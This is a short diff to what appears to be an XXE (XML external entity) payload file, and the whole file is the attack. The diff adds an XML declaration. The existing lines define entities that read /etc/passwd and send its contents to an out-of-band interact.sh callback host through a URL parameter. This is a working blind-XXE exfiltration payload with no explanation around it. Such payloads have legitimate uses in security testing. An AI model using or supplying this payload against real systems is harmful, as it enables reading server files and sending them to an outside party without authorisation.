@@ -1,3 +1,4 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!ENTITY % payload SYSTEM "file:///etc/passwd">
 <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://cb9aj082vtc0000mk02ggfwijyayyyyyb.interact.sh/x=%payload;">'>
 %param1;
